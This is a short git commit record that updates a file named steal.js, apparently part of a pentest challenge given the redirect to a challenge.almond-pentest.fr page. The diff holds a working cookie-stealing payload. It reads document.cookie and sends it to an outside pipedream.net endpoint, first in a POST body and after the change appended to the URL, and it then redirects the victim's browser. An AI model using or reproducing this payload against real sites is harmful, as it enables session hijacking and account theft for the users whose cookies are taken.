b3516b652608a94604f294bd5f47681629167136
vhash <29121316+LucasVanHaaren@users.noreply.github.com>
2024-10-23 17:15:27 +0200

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,8 +1,4 @@
 // send cookies
-fetch('https://eor294w8lwqac1y.m.pipedream.net', {
-  method: 'POST',
-  mode: 'no-cors',
-  body: document.cookie
-});
+fetch('https://eor294w8lwqac1y.m.pipedream.net'+document.cookie);
 // redirect to stealth
 window.location.replace("https://challenge.almond-pentest.fr/?p=&c=");
